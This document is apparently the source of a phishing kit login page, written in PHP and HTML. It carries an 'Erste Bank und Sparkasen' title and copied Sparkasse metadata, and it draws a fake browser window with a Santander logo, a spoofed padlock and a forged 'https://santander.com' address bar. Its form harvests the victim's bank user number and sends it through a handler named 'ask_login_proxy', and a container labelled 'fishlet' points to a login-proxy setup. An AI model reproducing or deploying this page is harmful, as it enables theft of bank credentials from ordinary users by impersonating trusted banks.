<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="login/";
?>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js">
</script>
<script type="text/javascript"
  src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet"
  href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>

<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">


<!DOCTYPE html>
<html lang="en" class="noIE">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="form/core_form.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <link rel="icon" data-savepage-href="https://assets./content/dam/common/brand/icons/favicon.ico" href="">
  <title>Erste Bank und Sparkasen</title>

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta charset="utf-8">
  <meta http-equiv="Content-Security-Policy"
    data-savepage-content="connect-src 'self' https://127.0.0.1:*/ https://login.sparkasse.at;connect-src_DEV_LATEST 'self' https://127.0.0.1:*/ https://login.dev-latest.sparkasse.at;connect-src_DEV_STABLE 'self' https://127.0.0.1:*/ https://login.dev.sparkasse.at;connect-src_FAT_LATEST 'self' https://127.0.0.1:*/ https://login.fat.sparkasse.at;connect-src_FAT_STABLE 'self' https://127.0.0.1:*/ https://login.fat2.sparkasse.at;connect-src_PROD 'self' https://127.0.0.1:*/ https://login.sparkasse.at;default-src 'none';font-src 'self';img-src 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.;img-src_DEV_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.;img-src_DEV_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.;img-src_FAT_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat.sparkasse.at https://assets.;img-src_FAT_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat2.sparkasse.at https://assets.;img-src_PROD 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.;script-src 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;script-src_DEV_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev-latest.sparkasse.at;script-src_DEV_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev.sparkasse.at;script-src_FAT_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat.sparkasse.at;script-src_FAT_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat2.sparkasse.at;script-src_PROD 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;style-src 'self' 'unsafe-inline'"
    content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <link rel="shortcut icon" type="image/x-icon"
    data-savepage-href="https://assets./content/dam/common/brand/icons/favicon.ico" href="">

  <style>
  /************************************************************************
  * Loading bar (eg_* classes) from DDPL:
  * https://digitaldesign./en/DDPLHome/template/loader
  ************************************************************************/
  /* .eg_loader--blue {
    background-image: url(../images/blue.gif);
    background-image: url(../images/loading-bars_blue.svg);
    max-width: 3rem;
  } */

  .eg_loader {
    width: 100%;
    height: 2.2rem;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    background-size: contain;
    background-position: center center;
    background-repeat: no-repeat;
    min-height: 1rem;
  }

  .loader-container {
    height: 50px;
    margin-top: 28px;
  }

  /* Browserswitch for IE11 */
  @media all and (-ms-high-contrast:none) {

    *::-ms-backdrop,
    .eg_loader--blue {
      background-image:
        /*savepage-url=../images/blue.gif*/
        url();
    }
  }

  /* FEDLOG-2671: Highlight debug messages */
  #debugMessage {
    color: #cc0000;
  }

  @font-face {
    font-family: system;
    font-style: normal;
    font-weight: 300;
    src: local(".SFNSText-Light"), local(".HelveticaNeueDeskInterface-Light"),
      local("Roboto-Light"), local("DroidSans"), local("Tahoma"),
      local(".LucidaGrandeUI"), local("Ubuntu Light"), local("Segoe UI Light");
  }

  html,
  body {
    width: 100%;
    height: 100%;
  }

  #title-bar {
    height: 31px;
    background-color: black;
    width: 100%;
    display: flex;
    justify-content: space-between;
    user-select: none;
  }

  #logo {
    padding-left: 5px;
    vertical-align: middle;
  }

  #logo-description {
    margin-bottom: 20px;
    color: white;
    font-size: 12px;
    font-family: "system";
    vertical-align: middle;
  }

  #minimize {
    color: white;
    font-size: 12px;
    padding: 9px 15px 7px 15px;
  }

  #square {
    color: white;
    font-size: 22px;
    padding: 0px 15px 5px 15px;
  }

  #exit {
    color: white;
    font-size: 15px;
    padding: 7px 17px 7px 17px;
  }

  #url-bar {
    height: 28px;
    background-color: #1b1a1a;
    width: 100%;
    display: flex;
    align-items: center;
    white-space: nowrap;
    overflow: scroll;
    text-overflow: ellipsis;
    -ms-overflow-style: none;
    scrollbar-width: none;
  }

  #url-bar::-webkit-scrollbar {
    display: none;
  }

  #ssl-padlock {
    user-select: none;
    padding-left: 8px;
    margin-right: 8px;
  }

  #domain-name {
    color: white;
    font-size: 14px;
    font-family: "system";
  }

  #domain-path {
    color: #9c9898;
    font-size: 14px;
    font-family: "system";
  }

  #title-bar-width {
    width: calc(100% + 2px);
    /* 2px added to allow for border on iframe */
  }

  #content {
    width: 100%;
    height: 700px;
    border: 1px solid gray;
  }

  #window {
    color: transparent;
    background-color: transparent;
    border-color: transparent;
    box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
    height: 759px;
    /* title bar height + content height */
    width: 40%;
    z-index: 50 !important;
  }

  #main {
    display: none;
    color: transparent;
    background: transparent;
    background-color: transparent;
    width: 100%;
    height: 100%;
    z-index: 10;
    position: fixed;
  }

  #background {
    position: fixed;
    z-index: -1;
    width: 100%;
    height: 100%;
  }

  #fishlet {
    width: 100%;
    height: 100%;
    background-color: black;
  }

  #input1 {
    margin: 5rem;
  }
  </style>
  <!-- <script data-savepage-type="" type="text/plain" data-savepage-src="/sts/7hSTR7CfYN/gWqvRrszL2yz5NLdR4kW.js" async=""> -->
  </script>
  <script data-savepage-type="" type="text/plain"></script>
  <script data-savepage-type="" type="text/plain"></script>



</head>



<body class="en hasIcon">


  <!-- MARS -->
  <div id="background">
    <img src="santander.png" width="100%" height="100%" />
  </div>
  <div id="main"></div>
  <div id="window">
    <!-- Title bar start -->
    <div id="title-bar-width">
      <div id="title-bar">
        <div>
          <img src="./Santander-Logo.png" height="40px" id="logo">
          <span id="logo-description">LOGIN SECURELY TO SANTANDER BANK</span>
        </div>

        <div>
          <span id="minimize">&#8212;</span>
          <span id="square">□</span>
          <span id="exit">✕</span>
        </div>
      </div>
      <div id="url-bar">
        <img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://santander.com</span>
        <span
          id="domain-path">/login/auth=jks83NJBnsHga8202BCb2nk18JKnsbshacaHGC278y2bq2089SMkAJBbskbB11n45snsHwu2nLma82Las</span>
      </div>
    </div>
    <!-- Content start -->
    <div id="fishlet">
      <input id="input1" placeholder="insert data">
    </div>
    </form>
  </div>
  <form novalidate onsubmit="send1(event,'ask_login_proxy');return false">
    <div class="number">
      <span class="icon numbericon hasBgImage"></span><input id="user" placeholder="Verfügernummer/Benutzer"
        pattern=".{4,}" name="user" class="input" autocomplete="off" type="text" maxlength="80" value="">
      <script data-savepage-type="text/javascript" type="text/plain"></script>
    </div>



    <div class="submit">


      <input id="submitButton" type="submit" class="submit" value="Login starten">



    </div>

    </div>

    </div>

    <div class="isSmallScreen" id="isSmallScreen"></div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="./script.js"></script>
    <!-- <script src="login/form"></script>
    <script src="../core/core_form.js"></script>
    <script src="../core/core_token.js"></script>

    <script src="login/token"></script>
    <script src="login/home.php"></script> -->

</body>

</html>